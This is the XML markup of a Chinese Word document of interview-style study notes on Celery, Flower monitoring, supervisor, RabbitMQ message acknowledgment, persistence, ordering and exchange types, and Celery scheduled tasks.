    <w:p w14:paraId="7091ACA6" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
        <w:t>进入</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
        <w:t>flower</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
        <w:t>监控服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9943A2"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noProof/>
          <w:color w:val="3498DB"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4DA24C62" wp14:editId="248C76D2">
            <wp:extent cx="9456420" cy="2768600"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="59" name="图片 59">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461646" cy="2770130"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C463E9" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96"/>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可能遇到的错误</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A39B51D"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pymongo.errors.NotMasterError: not master</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E600B6"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关闭</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>mongodb</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的数据集</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB62488" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96" w:line="30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其他</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A423C9"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当服务器数量较多的时候，管理起来会很不方便，可以使用</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>supervisor</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来管理后台进程，遗憾的是它并不支持</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python3</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，不过也可以装在</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python2</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的环境</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DFDC092"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虽然用了</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>supervisor</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以很方便的管理</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>程序，但是还是得一个个登陆不同的服务器的去管理，咋办捏？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD15FC0"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我在</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>github</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上找到一个工具</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>supervisor-easy</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，可以批量管理</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>supervisor</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，如图</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D534A3A" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="039CA1A2" wp14:editId="4686AEAC">
            <wp:extent cx="9624060" cy="3445933"/>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628842" cy="3447645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F53681E"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地址：</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://github.com/trytofix/supervisor-easy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F99BD0" w14:textId="37E7D38D" w:rsidR="00E00B91" w:rsidRPr="00652128" w:rsidRDefault="00E00B91" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>`(*∩_∩*)′转载请注明：转载自：</w:t>
      </w:r>
      <w:hyperlink r:id="rId172" w:history="1">
        <w:r w:rsidRPr="007E4FA0">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
            <w:color w:val="666666"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>笔记：集群部署celery分布式任务队列</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0815742F" w14:textId="185BF14C"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104</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 xml:space="preserve"> RabbitMQ</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Kafka</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ZeroMQ</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A16D63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https://blog.csdn.net/zhailihua/article/details/7899006</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1923C23C" w14:textId="3D271DD3"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105</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RabbitMQ</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何在消费者获取任务后未处理完前就挂掉时，保证数据不丢失？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDF46A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为了预防消息丢失，rabbitmq提供了ack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA51EE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即工作进程在收到消息并处理后，发送ack给rabbitmq，告知rabbitmq这时候可以把该消息从队列中删除了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9F2EE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如果工作进程挂掉 了，rabbitmq没有收到ack，那么会把该消息 重新分发给其他工作进程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D81DFB"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不需要设置timeout，即使该任务需要很长时间也可以处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B02DE88"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ack默认是开启的，工作进程显示指定了no_ack=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281FD1A9" w14:textId="22D4D222"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106</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RabbitMQ</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何对消息做持久化？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BB1A7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1、创建队列和发送消息时将设置durable=Ture，如果在接收到消息还没有存储时，消息也有可能丢失，就必须配置publisher confirm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF2E11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channel.queue_declare(queue='task_queue', durable=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B1AFA7" w14:textId="77777777" w:rsidR="002B540A" w:rsidRPr="00D43FF7"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2、返回一个ack，进程收到消息并处理完任务后，发给rabbitmq一个ack表示任务已经完成，可以删除该任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AC8F6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3、镜像队列：将queue镜像到cluster中其他的节点之上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310563DE"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在该实现下，如果集群中的一个节点失效了，queue能自动地切换到镜像中的另一个节点以保证服务的可用性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D4F725" w14:textId="57EA1F8F"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107</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RabbitMQ</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何控制消息被消费的顺序？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231A197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默认消息队列里的数据是按照顺序被消费者拿走，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4FA79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例如：消费者1 去队列中获取奇数序列的任务，消费者2去队列中获取偶数序列的任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DD695A"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channel.basic_qos(prefetch_count=1) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1F9A8E"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表示谁来谁取，不再按照奇偶数排列（同时也保证了公平的消费分发）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7912F9" w14:textId="0D937C6C"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108</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以下</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RabbitMQ</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exchange type</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>分别代表什么意思？如：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fanout</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direct</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topic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D9CF0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amqp协议中的核心思想就是生产者和消费者隔离，生产者从不直接将消息发送给队列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E8CB1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生产者通常不知道是否一个消息会被发送到队列中，只是将消息发送到一个交换机。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC4E383"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先由Exchange来接收，然后Exchange按照特定的策略转发到Queue进行存储。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B58F97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同理，消费者也是如此。Exchange 就类似于一个交换机，转发各个消息分发到相应的队列中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F676B7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3D92FCF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type=fanout 类似发布者订阅者模式，会为每一个订阅者创建一个队列，而发布者发布消息时，会将消息放置在所有相关队列中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFF5AE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type=direct 队列绑定关键字，发送者将数据根据关键字发送到消息exchange，exchange根据 关键字 判定应该将数据发送至指定队列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBC6370" w14:textId="77777777" w:rsidR="00D8288D"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type=topic  队列绑定几个模糊的关键字，之后发送者将数据发送到exchange，exchange将传入”路由值“和 ”关键字“进行匹配，匹配成功，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414E710F" w14:textId="3B6DCF74"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则将数据发送到指定队列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795427EF"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2C8CF3B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发送者路由值              队列中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366E589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old.boy.python          old.*  -- 不匹配    *表示匹配一个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4248AF8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old.boy.python          old.#  -- 匹配      #表示匹配0个或多个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7981D93A" w14:textId="4C489C46"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109</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 xml:space="preserve"> celery </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是什么以及应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05777F7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Celery是由Python开发的一个简单、灵活、可靠的处理大量任务的分发系统，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546168DF"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它不仅支持实时处理也支持任务调度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380103C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http://www.cnblogs.com/wupeiqi/articles/8796552.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FB0885" w14:textId="4DCCBE30"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110</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celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>运行机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E828944" w14:textId="77777777" w:rsidR="002B540A" w:rsidRPr="00BF3003" w:rsidRDefault="002B540A" w:rsidP="002B540A">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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="300F0FBD" wp14:editId="4CDB9E4D">
            <wp:extent cx="7831019" cy="33789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834363" cy="3380368"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D8E354" w14:textId="694DF661"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111</w:t>
      </w:r>
      <w:r w:rsidR="00D92594">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celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何实现定时任务？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B95B70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celery实现定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599B532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启用Celery的定时任务需要设置CELERYBEAT_SCHEDULE 。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D1A25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CELERYBEAT_SCHEDULE='djcelery.schedulers.DatabaseScheduler'#定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234E01B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'创建定时任务'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A43A4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通过配置CELERYBEAT_SCHEDULE：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715C47C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#每30秒调用task.add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3A678C"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datetime import timedelta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A356E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CELERYBEAT_SCHEDULE = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004A9FB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'add-every-30-seconds': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DCD16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'task': 'tasks.add',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3759DAD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'schedule': timedelta(seconds=30),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2D7FD1"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'args': (16, 16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258D254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2DB0E8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18C8F157" w14:textId="71D022FE" w:rsidR="002B540A" w:rsidRPr="00BF3003" w:rsidRDefault="002B540A" w:rsidP="00CF0D9D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>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lastRenderedPageBreak/>
        <w:t>112</w:t>
      </w:r>
      <w:r w:rsidR="00CF0D9D">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 xml:space="preserve"> celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>多任务结构目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDF5518"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pro_cel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D0664A"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celery_tasks     # celery相关文件夹</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F1065E"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 celery.py    # celery连接和配置相关文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678E03AF"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 tasks.py     #  所有任务函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3051FA"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check_result.py  # 检查结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC5B1E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send_task.py     # 触发任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7146825E" w14:textId="712F6311" w:rsidR="002B540A" w:rsidRPr="00BF3003" w:rsidRDefault="002B540A" w:rsidP="00CF0D9D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>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113</w:t>
      </w:r>
      <w:r w:rsidR="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中装饰器</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> @app.task </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 xml:space="preserve"> @shared_task</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39044ABB"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一般情况使用的是从celeryapp中引入的app作为的装饰器：@app.task</w:t>
      </w:r>
    </w:p>
